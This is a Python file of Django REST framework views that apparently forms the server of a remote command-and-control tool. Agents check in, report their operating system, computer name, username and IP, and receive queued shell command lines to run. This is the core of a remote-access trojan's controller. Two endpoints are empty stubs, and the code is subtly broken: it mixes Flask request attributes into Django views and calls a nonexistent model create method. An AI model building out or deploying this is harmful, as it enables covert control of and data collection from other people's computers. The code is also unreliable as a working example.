from rest_framework import status
from rest_framework.decorators import api_view
from rest_framework.response import Response

from .utils import Pipeline
from .models import Agent, Session, Agent_session

from datetime import datetime


@api_view(['POST'])
def push_command(request, agent_identifier):
    """
    Adds the command to the command queue

    :param request:
    :return:
    """
    pass


@api_view(['POST'])
def get_command(request, agent_identifier):
    agent = Agent.objects.filter(identifier=agent_identifier)
    if not agent:
        agent = Agent.create(identifier=agent_identifier)
    else:
        agent = Agent.objects.get(identifier=agent_identifier)

    info = request.json

    # initialise or update basic information about the agent
    agent.operating_system = info['operating_system']
    agent.computer_name = info['computer_name']
    agent.username = info['username']

    agent.last_online = datetime.now()
    agent.remote_ip = request.remote_addr
    agent.save()

    # get commands to run
    cmdline = ''
    commands = agent.commands.order_by('timestamp')
    if commands:
        cmdline = commands[0].cmdline
        commands[0].delete()
    return cmdline


@api_view(['POST'])
def output_command(request, agent_identifier):
    pass
